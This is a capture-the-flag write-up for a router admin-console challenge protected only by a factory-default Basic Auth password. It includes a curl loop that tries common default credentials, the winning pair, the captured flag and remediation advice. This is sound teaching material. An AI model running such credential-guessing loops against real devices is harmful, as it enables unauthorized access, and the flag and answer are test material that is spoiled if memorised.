# NetGuard_Router - default Basic-Auth credentials

| | |
|---|---|
| **Challenge** | NetGuard_Router |
| **Category** | AUTH |
| **Points / Difficulty** | 100 / easy |
| **Target** | http://auth1.chal.deti:8060 |
| **Auth weakness** | CWE-1392 (default credentials) + CWE-521 (weak password) |

## Hint
> A door at the door: one basic word guards the house, never changed since birth.

## Recon
NetGuard **NG-220**, firmware 2.1 (Flask/gunicorn). The landing page links to
**Open Admin Console** → `/admin`, which responds with an HTTP **Basic Auth**
challenge (`WWW-Authenticate: Basic`, the browser username/password popup).
"basic word" = HTTP Basic Auth; "never changed since birth" = factory default.

## Approach
CWE-1392/CWE-521: the admin console is protected only by a stock default
password that was never rotated. Walk a short default-credential list against
`/admin` and stop on the first `200`.

## Exploitation - the exact request
```bash
# find the winner
for cred in admin:admin admin:password admin: admin:admin123 admin:1234; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -u "$cred" http://auth1.chal.deti:8060/admin)
  echo "$code  $cred"
done
# admin:admin123 -> 200
curl -s -u admin:admin123 http://auth1.chal.deti:8060/admin | grep -o 'flag{[^}]*}'
```

## Response fragment that carried the flag
```html
<tr><th>ISP support token</th><td>flag{fe0e20230812db960a62e56c6cae5ec8}</td></tr>
```

## Flag
```
flag{fe0e20230812db960a62e56c6cae5ec8}
```

## Root cause & remediation
- **Cause:** admin console ships with a guessable default password
  (`admin:admin123`) and nothing forces a change, so anyone can log in.
- **Fix:** force a password change on first boot, forbid known-default/weak
  passwords (CWE-521), rate-limit auth, and don't expose the admin plane to
  untrusted networks.
